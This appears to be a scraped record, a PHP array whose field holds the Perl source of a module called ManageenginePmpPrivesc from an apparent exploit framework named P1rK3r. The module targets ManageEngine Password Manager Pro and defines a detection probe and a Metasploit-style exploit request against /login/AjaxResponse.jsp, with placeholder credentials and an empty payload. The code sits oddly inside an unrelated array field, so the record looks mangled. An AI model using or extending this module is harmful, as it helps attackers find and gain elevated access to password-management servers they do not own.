array (
  'platform' => 'ALL',
  'service' => 'MANAGEENGINE',
  'name' => 'ManageenginePmpPrivesc',
  'path' => '/j_security_check;',
  'j_username' => '__USERNAME__',
  'username' => '__USERNAME__',
  'j_password' => '__PASSWORD__',
  'domainName' => 'Exploits/MANAGEENGINE/MSF/ManageenginePmpPrivesc.pm
package P1rK3r::Exploits::MANAGEENGINE::MSF::ManageenginePmpPrivesc;
use parent qw(P1rK3r::Exploit P1rK3r::Services::MANAGEENGINE);

use 5.10.0;

use strict;
use warnings;

no warnings \'experimental\';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "ManageenginePmpPrivesc";

   my $DETECTION = {
        METHOD => \'POST\',
        PATH => \'/login/AjaxResponse.jsp\',
        PAYLOAD => \'\',
        TEXT => \'Checking If : /login/AjaxResponse.jsp Exists ...\',
        VALIDATION   => {
                TCODE => [\'200\'],
        },
   };

   my $EXPLOIT = {
        TYPE => \'MSF\',
        PLATFORM => \'ALL\',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => \'POST\',
                        PATH         => \'login/AjaxResponse.jsp\',
                        PAYLOAD      => \'\',
                        TEXT         => \'Sending Exploit #1 Request : [POST] /login/AjaxResponse.jsp\',
                        HEADERS      => {
                           \'Cookie\' => \'\',
                           \'Content-Type\' => \'application/x-www-form-urlencoded\',
                        },
                        VALIDATION   => {
                           TCODE => [\'200\'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;',
)